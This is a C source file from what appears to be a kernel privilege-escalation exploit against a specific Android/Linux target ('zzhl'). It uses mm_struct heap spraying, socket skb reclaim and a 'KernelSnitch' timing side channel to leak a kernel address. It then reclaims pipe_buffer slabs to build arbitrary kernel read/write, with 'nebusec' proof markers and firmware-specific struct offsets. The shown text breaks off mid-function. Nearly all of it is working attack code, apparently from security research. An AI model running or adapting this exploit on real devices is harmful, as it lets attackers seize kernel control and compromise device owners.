#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "aar_aaw.h"
#include "diag_checkpoint.h"
#include "pipe_physrw.h"
#include "target_zzhl.h"

/* kernelsnitch.h contains the implementation and is already emitted once by
 * groom.c. Keep this translation unit on its public ABI to avoid duplicate
 * definitions while reusing the same in-tree implementation. */
struct kernelsnitch_shared_state;
struct kernelsnitch_shared_state *kernelsnitch_setup(
    size_t mm_struct_sz, size_t mm_slab_order, size_t thread_cnt,
    size_t collision_cnt, size_t verbose, size_t mte_enabled);
void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks);
size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks);
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks);
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks);
void kernelsnitch_set_profile(struct kernelsnitch_shared_state *ks,
                              size_t appended_futexes,
                              size_t repeat_measurement, size_t average);

/* KernelSnitch measurement default (AVERAGE from kernelsnitch.h); the struct
 * is opaque in this TU so it is passed explicitly. */
#define OSS_KSNITCH_AVERAGE 8
#define OSS_KSNITCH_REPEAT_DEFAULT 128
#define OSS_KSNITCH_APPENDED_DEFAULT 4096

#define OSS_PAGE_SIZE 0x1000ULL
#define OSS_PAGE_MASK (OSS_PAGE_SIZE - 1)
#define OSS_MM_ORDER 3
#define OSS_ORDER3_SIZE (OSS_PAGE_SIZE << OSS_MM_ORDER)
#define OSS_MM_STRUCT_SIZE 0x400ULL
#define OSS_MM_OBJECTS_PER_SLAB (OSS_ORDER3_SIZE / OSS_MM_STRUCT_SIZE)
#define OSS_MM_PARTIALS 5
#define OSS_KSNITCH_COLLISIONS 4
#define OSS_SKB_SEND_SIZE 0x8e80

#define OSS_PIPE_DRAIN_COUNT 240
#define OSS_PIPE_COUNT 256
#define OSS_PIPE_SLOTS 32
#define OSS_F_SETPIPE_SZ 0x407
#define OSS_PIPE_OBJECT_SIZE 0x800
#define OSS_PIPE_BUFFER_SIZE 0x28
#define OSS_PIPE_CAN_MERGE 0x10
#define OSS_PIPE_SCAN_CHUNK 0x400
#define OSS_PIPE_ATTEMPTS 12
#define OSS_PIPE_PREPARE_TIMEOUT_MS 20000
#define OSS_PIPE_INSTALL_TIMEOUT_MS 120000
#define OSS_PIPE_IO_TIMEOUT_MS 1000
#define OSS_PIPE_MAX_SLABS (OSS_ORDER3_SIZE / OSS_PAGE_SIZE)

#define OSS_DIRECT_MAP_BASE 0xffffff8000000000ULL
#define OSS_DIRECT_MAP_END 0xffffff9000000000ULL
#define OSS_VMEMMAP_START 0xfffffffe00000000ULL
#define OSS_VMEMMAP_END 0xfffffffe40000000ULL
#define OSS_STRUCT_PAGE_SIZE 0x40ULL
#define OSS_STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08ULL
#define OSS_STRUCT_SLAB_CACHE_OFF 0x18ULL

#define OSS_KMALLOC_CACHES_OFF ZZHL_KMALLOC_CACHES_OFF
#define OSS_ANON_PIPE_BUF_OPS_OFF ZZHL_ANON_PIPE_BUF_OPS_OFF

/* Deterministic pipe_buffer resolution (Tier 2), layouts checked against
 * targets/zzhl-WIP/firmware/vmlinux_ZZHL.btf via pahole. Walk:
 * init_task.tasks -> task(pid) -> files -> fdt -> fd[pipe] ->
 * file.private_data (pipe_inode_info) -> bufs[tail & (ring_size-1)].page. */
#define OSS_INIT_TASK_OFF ZZHL_INIT_TASK_OFF  /* &init_task from kernel_base */
#define OSS_TASK_TASKS_OFF 0x4d0ULL      /* task_struct.tasks (list_head) */
#define OSS_TASK_PID_OFF 0x5d8ULL        /* task_struct.pid */
#define OSS_TASK_COMM_OFF 0x7a8ULL       /* task_struct.comm[16] */
#define OSS_TASK_FILES_OFF 0x7d8ULL      /* task_struct.files */
#define OSS_FILES_FDT_OFF 0x20ULL        /* files_struct.fdt */
#define OSS_FDTABLE_FD_OFF 0x08ULL       /* fdtable.fd (file **) */
#define OSS_FILE_PRIVATE_DATA_OFF 0xd8ULL /* file.private_data */
#define OSS_PIPE_HEAD_OFF 0x60ULL        /* pipe_inode_info.head */
#define OSS_PIPE_TAIL_OFF 0x64ULL        /* pipe_inode_info.tail */
#define OSS_PIPE_RING_SIZE_OFF 0x6cULL   /* pipe_inode_info.ring_size */
#define OSS_PIPE_BUFS_OFF 0xa8ULL        /* pipe_inode_info.bufs */
#define OSS_PIPE_BUF_PAGE_OFF 0x00ULL    /* pipe_buffer.page */
#define OSS_PIPE_BUF_OPS_OFF 0x10ULL     /* pipe_buffer.ops */
#define OSS_PIPE_BUF_STRIDE 0x28ULL      /* sizeof(struct pipe_buffer) */
#define OSS_KMALLOC_BUCKETS 14
#define OSS_KMALLOC_NORMAL_2K_SLOT 11
#define OSS_KMALLOC_CGROUP_2K_SLOT (2 * OSS_KMALLOC_BUCKETS + 11)
#define OSS_KMALLOC_CACHE_SLOTS 56

#define OSS_PROOF_OFF 0x7100ULL
#define OSS_PROOF_READ_TAG "nebusec_70687973727730"
#define OSS_PROOF_WRITE_TAG "nebusec_70687973727731"
#define OSS_PROOF_READ 0x306365737562656eULL /* "nebusec0" */
#define OSS_PROOF_WRITE 0x316365737562656eULL /* "nebusec1" */

struct oss_mm_ctx {
  size_t count;
  pid_t *children;
  int *memfds;
};

struct oss_pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

enum pipe_prepare_stage {
  PIPE_STAGE_IDLE = 0,
  PIPE_STAGE_BANKS,
  PIPE_STAGE_CONTEXTS,
  PIPE_STAGE_PINNED_MM,
  PIPE_STAGE_KSNITCH_SETUP,
  PIPE_STAGE_COLLISIONS,
  PIPE_STAGE_SOCKET_RECLAIM,
  PIPE_STAGE_BRUTEFORCE,
  PIPE_STAGE_RESIZE_DRAIN,
  PIPE_STAGE_RESIZE_RECLAIM,
  PIPE_STAGE_DONE,
};

enum pipe_error {
  PIPE_E_NONE = 0,
  PIPE_E_PREPARE,
  PIPE_E_PREPARE_TIMEOUT,
  PIPE_E_CACHE_SELECT,
  PIPE_E_MARKER_WRITE,
  PIPE_E_VICTIM_SCAN,
  PIPE_E_VICTIM_CONFIRM,
  PIPE_E_READ_PROOF,
  PIPE_E_WRITE_PROOF,
  PIPE_E_RESTORE,
  PIPE_E_INSTALL_TIMEOUT,
};

struct pipe_prepare_progress {
  atomic_int stage;
  atomic_int error_no;
};

struct pipe_attempt_diag {
  enum pipe_error error;
  enum pipe_prepare_stage stage;
  int error_no;
  uint64_t elapsed_ms;
};

_Static_assert(sizeof(struct oss_pipe_buffer) == OSS_PIPE_BUFFER_SIZE,
               "pipe_buffer layout");

static pthread_once_t g_init_once = PTHREAD_ONCE_INIT;
static atomic_int g_prepare_request;
static atomic_int g_prepare_done;
static atomic_int g_prepare_ok;
static atomic_int g_prepare_active;
static int g_drain_pipes[OSS_PIPE_COUNT][2];
static int g_reclaim_pipes[OSS_PIPE_COUNT][2];
static pid_t g_holder_pid = -1;
enum p0_oracle_ownership {
  P0_ORACLE_IDLE = 0,
  P0_ORACLE_PREPARED,
  P0_ORACLE_NARROWED,
  P0_ORACLE_FRESH_READY,
};
static enum p0_oracle_ownership g_p0_oracle_ownership;
static int g_p0_oracle_pipe = -1;
static uint64_t g_pipe_page_base;
static uint64_t g_victim_addr;
static uint64_t g_kernel_base;
static uint64_t g_payload_base;
static int g_victim_pipe = -1;
static int g_installed;
static struct kernelsnitch_shared_state *g_ks;
static atomic_int g_io_restore_failed;
static struct pipe_attempt_diag g_prepare_diag;
static atomic_int g_prepare_timeout_ms;

static uint64_t monotonic_ms(void) {
  struct timespec now;
  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) {
    return 0;
  }
  return (uint64_t)now.tv_sec * 1000ULL + (uint64_t)now.tv_nsec / 1000000ULL;
}

static int deadline_remaining_ms(uint64_t deadline_ms) {
  uint64_t now = monotonic_ms();
  if (!now || now >= deadline_ms) {
    return 0;
  }
  uint64_t remaining = deadline_ms - now;
  return remaining > INT32_MAX ? INT32_MAX : (int)remaining;
}

static const char *pipe_stage_name(enum pipe_prepare_stage stage) {
  switch (stage) {
  case PIPE_STAGE_IDLE: return "idle";
  case PIPE_STAGE_BANKS: return "banks";
  case PIPE_STAGE_CONTEXTS: return "contexts";
  case PIPE_STAGE_PINNED_MM: return "pinned-mm";
  case PIPE_STAGE_KSNITCH_SETUP: return "kernelsnitch-setup";
  case PIPE_STAGE_COLLISIONS: return "collisions";
  case PIPE_STAGE_SOCKET_RECLAIM: return "socket-reclaim";
  case PIPE_STAGE_BRUTEFORCE: return "bruteforce";
  case PIPE_STAGE_RESIZE_DRAIN: return "resize-drain";
  case PIPE_STAGE_RESIZE_RECLAIM: return "resize-reclaim";
  case PIPE_STAGE_DONE: return "done";
  }
  return "unknown";
}

static const char *pipe_error_name(enum pipe_error error) {
  switch (error) {
  case PIPE_E_NONE: return "none";
  case PIPE_E_PREPARE: return "prepare";
  case PIPE_E_PREPARE_TIMEOUT: return "prepare-timeout";
  case PIPE_E_CACHE_SELECT: return "cache-select";
  case PIPE_E_MARKER_WRITE: return "marker-write";
  case PIPE_E_VICTIM_SCAN: return "victim-scan";
  case PIPE_E_VICTIM_CONFIRM: return "victim-confirm";
  case PIPE_E_READ_PROOF: return "read-proof";
  case PIPE_E_WRITE_PROOF: return "write-proof";
  case PIPE_E_RESTORE: return "restore";
  case PIPE_E_INSTALL_TIMEOUT: return "install-timeout";
  }
  return "unknown";
}

static void state_init_once(void) {
  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
    g_drain_pipes[i][0] = -1;
    g_drain_pipes[i][1] = -1;
    g_reclaim_pipes[i][0] = -1;
    g_reclaim_pipes[i][1] = -1;
  }
}

static void ensure_initialized(void) { pthread_once(&g_init_once, state_init_once); }

static void raise_rlimit_best_effort(int resource) {
  struct rlimit limit;
  if (getrlimit(resource, &limit) == 0) {
    limit.rlim_cur = limit.rlim_max;
    setrlimit(resource, &limit);
  }
}

static int pin_cpu0(void) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  return sched_setaffinity(0, sizeof(set), &set) == 0;
}

static int set_pipe_slots(int pipefd[2], int slots) {
  return fcntl(pipefd[0], OSS_F_SETPIPE_SZ,
               slots * (int)OSS_PAGE_SIZE) != -1;
}

static void close_pipe_bank(int bank[OSS_PIPE_COUNT][2], size_t count) {
  for (size_t i = 0; i < count; i++) {
    if (bank[i][0] >= 0) {
      close(bank[i][0]);
      bank[i][0] = -1;
    }
    if (bank[i][1] >= 0) {
      close(bank[i][1]);
      bank[i][1] = -1;
    }
  }
}

static int create_pipe_bank(int bank[OSS_PIPE_COUNT][2], size_t count) {
  for (size_t i = 0; i < count; i++) {
    if (pipe(bank[i]) != 0 || !set_pipe_slots(bank[i], 2)) {
      if (bank[i][0] >= 0) {
        close(bank[i][0]);
        bank[i][0] = -1;
      }
      if (bank[i][1] >= 0) {
        close(bank[i][1]);
        bank[i][1] = -1;
      }
      return 0;
    }
  }
  return 1;
}

static int resize_pipe_bank(int bank[OSS_PIPE_COUNT][2], size_t count,
                            int slots) {
  for (size_t i = 0; i < count; i++) {
    if (bank[i][0] < 0 || !set_pipe_slots(bank[i], slots)) {
      return 0;
    }
  }
  return 1;
}

static int init_mm_ctx(struct oss_mm_ctx *ctx, size_t count) {
  memset(ctx, 0, sizeof(*ctx));
  ctx->count = count;
  ctx->children = malloc(count * sizeof(*ctx->children));
  ctx->memfds = malloc(count * sizeof(*ctx->memfds));
  if (!ctx->children || !ctx->memfds) {
    free(ctx->children);
    free(ctx->memfds);
    memset(ctx, 0, sizeof(*ctx));
    return 0;
  }
  for (size_t i = 0; i < count; i++) {
    ctx->children[i] = -1;
    ctx->memfds[i] = -1;
  }
  return 1;
}

static void kill_child(pid_t *child) {
  if (*child <= 0) {
    return;
  }
  kill(*child, SIGKILL);
  while (waitpid(*child, NULL, 0) < 0 && errno == EINTR) {
  }
  *child = -1;
}

static int kill_oracle_holder_confirmed(void) {
  pid_t child = g_holder_pid;
  if (child <= 0) return 1;
  if (kill(child, SIGKILL) != 0 && errno != ESRCH) return 0;
  pid_t waited;
  do {
    waited = waitpid(child, NULL, 0);
  } while (waited < 0 && errno == EINTR);
  if (waited != child) return 0;
  g_holder_pid = -1;
  return 1;
}

static void cleanup_mm_ctx(struct oss_mm_ctx *ctx) {
  if (!ctx) {
    return;
  }
  for (size_t i = 0; i < ctx->count; i++) {
    kill_child(&ctx->children[i]);
    if (ctx->memfds[i] >= 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
  free(ctx->children);
  free(ctx->memfds);
  memset(ctx, 0, sizeof(*ctx));
}

static pid_t spawn_mm_child(void) {
  pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1 || !pin_cpu0()) {
      _exit(1);
    }
    for (;;) {
      pause();
    }
  }
  return child;
}

static int open_child_mem(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return open(path, O_RDONLY | O_CLOEXEC);
}

static int make_pinned_memfd(void) {
  pid_t child = spawn_mm_child();
  if (child < 0) {
    return -1;
  }
  int fd = open_child_mem(child);
  kill_child(&child);
  return fd;
}

static pid_t spawn_collision_child(void) {
  pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1) {
      _exit(1);
    }
    kernelsnitch_find_collisions(g_ks);
    _exit(0);
  }
  return child;
}

static int fill_dead_mm_ctx(struct oss_mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->count; i++) {
    ctx->memfds[i] = make_pinned_memfd();
    if (ctx->memfds[i] < 0) {
      return 0;
    }
  }
  return 1;
}

static void kill_live_children(struct oss_mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->count; i++) {
    kill_child(&ctx->children[i]);
  }
}

static int close_memfd_at(struct oss_mm_ctx *ctx, size_t index) {
  if (index >= ctx->count || ctx->memfds[index] < 0) {
    return 0;
  }
  int ok = close(ctx->memfds[index]) == 0;
  ctx->memfds[index] = -1;
  return ok;
}

static int send_skb(int sock, void *buffer) {
  struct iovec iov = {
      .iov_base = buffer,
      .iov_len = OSS_SKB_SEND_SIZE,
  };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  return sendmsg(sock, &msg, 0) == (ssize_t)OSS_SKB_SEND_SIZE;
}

/* FUN_00107dd4: second order-3 mm_struct reclaim, with 240 drain pipes and
 * 240 reclaim pipes. Runs inside the long-lived holder child. */
static void set_prepare_progress(struct pipe_prepare_progress *progress,
                                 enum pipe_prepare_stage stage) {
  atomic_store_explicit(&progress->stage, stage, memory_order_release);
  atomic_store_explicit(&progress->error_no, errno, memory_order_release);
}

/* Experiment knob shared with groom.c: KernelSnitch measurement repeat and
 * appended-futex counts, env-gated, defaults preserve the closed profile. */
static long pipe_env_long_clamped(const char *name, long fallback, long lo,
                                  long hi) {
  const char *raw = getenv(name);
  if (!raw || !*raw) return fallback;
  errno = 0;
  char *end = NULL;
  long v = strtol(raw, &end, 0);
  if (errno != 0 || end == raw || *end != '\0' || v < lo || v > hi) {
    return fallback;
  }
  return v;
}

static uint64_t prepare_pipe_page_child(
    struct pipe_prepare_progress *progress) {
  struct oss_mm_ctx prep = {0}, spray = {0}, pre = {0}, post = {0};
  pid_t leak_child = -1;
  int leak_memfd = -1;
  int pcp[2] = {-1, -1};
  int reclaim[2] = {-1, -1};
  unsigned char *skb = NULL;
  uint64_t base = 0;

  raise_rlimit_best_effort(RLIMIT_NOFILE);
  raise_rlimit_best_effort(RLIMIT_NPROC);
  set_prepare_progress(progress, PIPE_STAGE_CONTEXTS);
  if (!init_mm_ctx(&prep, 32 * OSS_MM_OBJECTS_PER_SLAB) ||
      !init_mm_ctx(&spray, (1 + OSS_MM_PARTIALS) * OSS_MM_OBJECTS_PER_SLAB) ||
      !init_mm_ctx(&pre, OSS_MM_OBJECTS_PER_SLAB - 1) ||
      !init_mm_ctx(&post, OSS_MM_OBJECTS_PER_SLAB)) {
    goto out;
  }
  set_prepare_progress(progress, PIPE_STAGE_PINNED_MM);
  if (!fill_dead_mm_ctx(&prep) || !fill_dead_mm_ctx(&spray)) {
    goto out;
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  set_prepare_progress(progress, PIPE_STAGE_KSNITCH_SETUP);
  g_ks = kernelsnitch_setup(OSS_MM_STRUCT_SIZE, OSS_MM_ORDER, cpu_count,
                            OSS_KSNITCH_COLLISIONS, 0, 0);
  if (!g_ks || !fill_dead_mm_ctx(&pre)) {
    goto out;
  }
  {
    long ks_appended = pipe_env_long_clamped(
        "KSNITCH_APPENDED", OSS_KSNITCH_APPENDED_DEFAULT, 256,
        OSS_KSNITCH_APPENDED_DEFAULT);
    long ks_repeat = pipe_env_long_clamped(
        "KSNITCH_REPEAT", OSS_KSNITCH_REPEAT_DEFAULT, OSS_KSNITCH_AVERAGE,
        OSS_KSNITCH_REPEAT_DEFAULT);
    kernelsnitch_set_profile(g_ks, (size_t)ks_appended, (size_t)ks_repeat,
                              OSS_KSNITCH_AVERAGE);
    fprintf(stderr, "[pipe_rw] ksnitch profile appended=%ld repeat=%ld average=%d\n",
            ks_appended, ks_repeat, OSS_KSNITCH_AVERAGE);
  }
  set_prepare_progress(progress, PIPE_STAGE_COLLISIONS);
  leak_child = spawn_collision_child();
  if (leak_child < 0 || !fill_dead_mm_ctx(&post)) {
    goto out;
  }
  leak_memfd = open_child_mem(leak_child);
  if (leak_memfd < 0) {
    goto out;
  }

  kill_live_children(&pre);
  kill_live_children(&post);
  kill_live_children(&spray);
  while (waitpid(leak_child, NULL, 0) < 0 && errno == EINTR) {
  }
  leak_child = -1;
  if (!kernelsnitch_found_collisions(g_ks)) {
    goto out;
  }

  skb = malloc(OSS_SKB_SEND_SIZE);
  if (!skb) {
    goto out;
  }
  memset(skb, 0x50, OSS_SKB_SEND_SIZE);
  /* FUN_00107dd4 allocates the reclaim pair first and the PCP priming pair
   * second. Preserve that socket-allocation order: it affects the allocator
   * state immediately before the order-3 reclaim. */
  set_prepare_progress(progress, PIPE_STAGE_SOCKET_RECLAIM);
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim) != 0 ||
      socketpair(AF_UNIX, SOCK_STREAM, 0, pcp) != 0 ||
      !send_skb(pcp[0], skb) || !pin_cpu0()) {
    goto out;
  }

  for (int i = 0; i < 4; i++) {
    sched_yield();
  }
  for (size_t i = 0; i < pre.count; i++) {
    if (!close_memfd_at(&pre, i)) {
      goto out;
    }
  }
  for (size_t i = 0; i + 1 < post.count; i++) {
    if (!close_memfd_at(&post, i)) {
      goto out;
    }
  }
  for (size_t i = 0; i < spray.count; i += OSS_MM_OBJECTS_PER_SLAB) {
    if (!close_memfd_at(&spray, i)) {
      goto out;
    }
  }
  close(pcp[0]);
  close(pcp[1]);
  pcp[0] = pcp[1] = -1;
  for (int i = 0; i < 4; i++) {
    sched_yield();
  }
  close(leak_memfd);
  leak_memfd = -1;
  if (!send_skb(reclaim[0], skb)) {
    goto out;
  }

  set_prepare_progress(progress, PIPE_STAGE_BRUTEFORCE);
  kernelsnitch_bruteforce(g_ks);
  size_t leaked = kernelsnitch_cleanup(g_ks);
  g_ks = NULL;
  if (leaked == (size_t)-1) {
    goto out;
  }
  base = (uint64_t)leaked & ~(OSS_ORDER3_SIZE - 1);

  set_prepare_progress(progress, PIPE_STAGE_RESIZE_DRAIN);
  if (!resize_pipe_bank(g_drain_pipes, OSS_PIPE_DRAIN_COUNT, OSS_PIPE_SLOTS) || !pin_cpu0()) {
    base = 0;
    goto out;
  }
  close(reclaim[0]);
  close(reclaim[1]);
  reclaim[0] = reclaim[1] = -1;
  set_prepare_progress(progress, PIPE_STAGE_RESIZE_RECLAIM);
  if (!resize_pipe_bank(g_reclaim_pipes, OSS_PIPE_COUNT, OSS_PIPE_SLOTS)) {
    base = 0;
    goto out;
  }

out:
  if (base) {
    set_prepare_progress(progress, PIPE_STAGE_DONE);
  } else {
    atomic_store_explicit(&progress->error_no, errno, memory_order_release);
  }
  if (leak_child > 0) {
    kill_child(&leak_child);
  }
  if (leak_memfd >= 0) {
    close(leak_memfd);
  }
  if (pcp[0] >= 0) {
    close(pcp[0]);
  }
  if (pcp[1] >= 0) {
    close(pcp[1]);
  }
  if (reclaim[0] >= 0) {
    close(reclaim[0]);
  }
  if (reclaim[1] >= 0) {
    close(reclaim[1]);
  }
  cleanup_mm_ctx(&prep);
  cleanup_mm_ctx(&spray);
  cleanup_mm_ctx(&pre);
  cleanup_mm_ctx(&post);
  free(skb);
  return base;
}

static int write_full(int fd, const void *buffer, size_t length) {
  const unsigned char *cursor = buffer;
  while (length != 0) {
    ssize_t n = write(fd, cursor, length);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    cursor += n;
    length -= (size_t)n;
  }
  return 1;
}

static uint64_t prepare_pipe_page(int timeout_ms, struct pipe_attempt_diag *diag) {
  ensure_initialized();
  uint64_t started_ms = monotonic_ms();
  memset(diag, 0, sizeof(*diag));
  diag->error = PIPE_E_PREPARE;
  diag->stage = PIPE_STAGE_BANKS;
  if (!create_pipe_bank(g_drain_pipes, OSS_PIPE_DRAIN_COUNT) ||
      !create_pipe_bank(g_reclaim_pipes, OSS_PIPE_COUNT)) {
    diag->error_no = errno;
    close_pipe_bank(g_drain_pipes, OSS_PIPE_DRAIN_COUNT);
    close_pipe_bank(g_reclaim_pipes, OSS_PIPE_COUNT);
    diag->elapsed_ms = monotonic_ms() - started_ms;
    return 0;
  }

  struct pipe_prepare_progress *progress = mmap(
      NULL, sizeof(*progress), PROT_READ | PROT_WRITE,
      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (progress == MAP_FAILED) {
    diag->error_no = errno;
    close_pipe_bank(g_drain_pipes, OSS_PIPE_DRAIN_COUNT);
    close_pipe_bank(g_reclaim_pipes, OSS_PIPE_COUNT);
    diag->elapsed_ms = monotonic_ms() - started_ms;
    return 0;
  }
  atomic_init(&progress->stage, PIPE_STAGE_BANKS);
  atomic_init(&progress->error_no, 0);

  int result_pipe[2] = {-1, -1};
  if (pipe(result_pipe) != 0) {
    diag->error_no = errno;
    munmap(progress, sizeof(*progress));
    close_pipe_bank(g_drain_pipes, OSS_PIPE_DRAIN_COUNT);
    close_pipe_bank(g_reclaim_pipes, OSS_PIPE_COUNT);
    return 0;
  }
  pid_t child = fork();
  if (child < 0) {
    diag->error_no = errno;
    close(result_pipe[0]);
    close(result_pipe[1]);
    close_pipe_bank(g_drain_pipes, OSS_PIPE_DRAIN_COUNT);
    close_pipe_bank(g_reclaim_pipes, OSS_PIPE_COUNT);
    munmap(progress, sizeof(*progress));
    diag->elapsed_ms = monotonic_ms() - started_ms;
    return 0;
  }
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1) {
      _exit(1);
    }
    close(result_pipe[0]);
    uint64_t base = prepare_pipe_page_child(progress);
    close_pipe_bank(g_drain_pipes, OSS_PIPE_DRAIN_COUNT);
    write_full(result_pipe[1], &base, sizeof(base));
    close(result_pipe[1]);
    if (!base) {
      _exit(1);
    }
    for (;;) {
      sleep(60);
    }
  }

  g_holder_pid = child;
  close(result_pipe[1]);
  uint64_t base = 0;
  int got = 0;
  uint64_t deadline_ms = monotonic_ms() + (uint64_t)timeout_ms;
  for (;;) {
    int remaining_ms = deadline_remaining_ms(deadline_ms);
    if (remaining_ms <= 0) {
      enum pipe_prepare_stage live_stage =
          (enum pipe_prepare_stage)atomic_load_explicit(
              &progress->stage, memory_order_acquire);
      int live_errno = atomic_load_explicit(&progress->error_no,
                                            memory_order_acquire);
      fprintf(stderr,
              "[pipe_rw] prepare deadline exceeded stage=%s errno=%d; "
              "cancelling holder\n",
              pipe_stage_name(live_stage), live_errno);
      diag->error_no = ETIMEDOUT;
      break;
    }
    struct pollfd pfd = {.fd = result_pipe[0], .events = POLLIN | POLLHUP};
    int poll_ret = poll(&pfd, 1, remaining_ms);
    if (poll_ret < 0 && errno == EINTR) {
      continue;
    }
    if (poll_ret <= 0) {
      if (poll_ret < 0) {
        diag->error_no = errno;
      }
      if (poll_ret == 0) {
        continue;
      }
      break;
    }
    if (pfd.revents & (POLLIN | POLLHUP)) {
      ssize_t n = read(result_pipe[0], &base, sizeof(base));
      got = n == (ssize_t)sizeof(base);
      if (!got && n < 0) {
        diag->error_no = errno;
      }
      break;
    }
    diag->error_no = EIO;
    break;
  }
  diag->stage = (enum pipe_prepare_stage)atomic_load_explicit(
      &progress->stage, memory_order_acquire);
  if (!diag->error_no) {
    diag->error_no = atomic_load_explicit(&progress->error_no,
                                          memory_order_acquire);
  }
  close(result_pipe[0]);
  close_pipe_bank(g_drain_pipes, OSS_PIPE_DRAIN_COUNT);
  if (!got || !base) {
    kill_child(&g_holder_pid);
    close_pipe_bank(g_reclaim_pipes, OSS_PIPE_COUNT);
    diag->error = PIPE_E_PREPARE;
    munmap(progress, sizeof(*progress));
    diag->elapsed_ms = monotonic_ms() - started_ms;
    return 0;
  }
  diag->error = PIPE_E_NONE;
  diag->stage = PIPE_STAGE_DONE;
  munmap(progress, sizeof(*progress));
  diag->elapsed_ms = monotonic_ms() - started_ms;
  return base;
}

static int is_direct_ptr(uint64_t addr) {
  return addr >= OSS_DIRECT_MAP_BASE && addr < OSS_DIRECT_MAP_END;
}

static uint64_t direct_to_page(uint64_t addr) {
  return OSS_VMEMMAP_START +
         (((addr - OSS_DIRECT_MAP_BASE) >> 12) * OSS_STRUCT_PAGE_SIZE);
}

static uint64_t page_to_direct(uint64_t page) {
  if (page < OSS_VMEMMAP_START || page >= OSS_VMEMMAP_END ||
      (page - OSS_VMEMMAP_START) % OSS_STRUCT_PAGE_SIZE != 0) {
    return 0;
  }
  return OSS_DIRECT_MAP_BASE +
         ((page - OSS_VMEMMAP_START) / OSS_STRUCT_PAGE_SIZE) * OSS_PAGE_SIZE;
}

static int collect_pipe_slabs(int fd, uint64_t slabs[OSS_PIPE_MAX_SLABS],
                              size_t *slab_count) {
  uint64_t caches[OSS_KMALLOC_CACHE_SLOTS];
  uint64_t caches_addr = g_kernel_base + OSS_KMALLOC_CACHES_OFF;
  *slab_count = 0;
  if (!oss_kernel_read(fd, caches_addr, caches, sizeof(caches))) {
    return 0;
  }
  uint64_t normal_2k = caches[OSS_KMALLOC_NORMAL_2K_SLOT];
  uint64_t cgroup_2k = caches[OSS_KMALLOC_CGROUP_2K_SLOT];
  size_t matching_pages = 0;
  if (!is_direct_ptr(normal_2k) || !is_direct_ptr(cgroup_2k)) {
    return 0;
  }

  for (uint64_t off = 0; off < OSS_ORDER3_SIZE; off += OSS_PAGE_SIZE) {
    uint64_t page_addr = g_pipe_page_base + off;
    uint64_t page = direct_to_page(page_addr);
    uint64_t compound_head = oss_kernel_read64(fd,
        page + OSS_STRUCT_PAGE_COMPOUND_HEAD_OFF);
    if (compound_head == UINT64_MAX) {
      return 0;
    }
    if (compound_head & 1) {
      page = compound_head & ~1ULL;
    }
    uint64_t slab_cache = oss_kernel_read64(
        fd, page + OSS_STRUCT_SLAB_CACHE_OFF);
    if (slab_cache == normal_2k || slab_cache == cgroup_2k) {
      matching_pages++;
      uint64_t slab_base = page_to_direct(page);
      if (!slab_base) {
        return 0;
      }
      size_t i = 0;
      while (i < *slab_count && slabs[i] != slab_base) {
        i++;
      }
      if (i == *slab_count && *slab_count < OSS_PIPE_MAX_SLABS) {
        slabs[(*slab_count)++] = slab_base;
      }
    }
  }
  fprintf(stderr,
          "[pipe_rw] selection kmalloc2k_pages=%zu kmalloc2k_slabs=%zu "
          "scan_base=%016llx\n",
          matching_pages, *slab_count,
          (unsigned long long)g_pipe_page_base);
  return *slab_count != 0;
}

static unsigned char pipe_marker_byte(size_t pipe_index, size_t offset) {
  /* Byte zero is unique across all 240 pipes; following bytes make stale or
   * shifted contents fail the non-destructive marker check as well. */
  return (unsigned char)(((pipe_index + 1U) + offset * 131U) & 0xffU);
}

static void fill_pipe_marker(unsigned char *marker, size_t pipe_index,
                             size_t length) {
  for (size_t i = 0; i < length; i++) {
    marker[i] = pipe_marker_byte(pipe_index, i);
  }
}

static int populate_pipe_markers(void) {
  unsigned char marker[OSS_PIPE_COUNT];
  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
    fill_pipe_marker(marker, i, i + 1);
    if (!write_full(g_reclaim_pipes[i][1], marker, i + 1)) {
      return 0;
    }
  }
  return 1;
}

static int prove_pipe_rw(int fd, enum pipe_error *error);

static int read_full(int fd, void *buffer, size_t length) {
  unsigned char *cursor = buffer;
  while (length != 0) {
    ssize_t n = read(fd, cursor, length);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    cursor += n;
    length -= (size_t)n;
  }
  return 1;
}

static int peek_pipe_marker(int pipe_index, size_t length) {
  int duplicate[2] = {-1, -1};
  unsigned char got[OSS_PIPE_COUNT + 1];
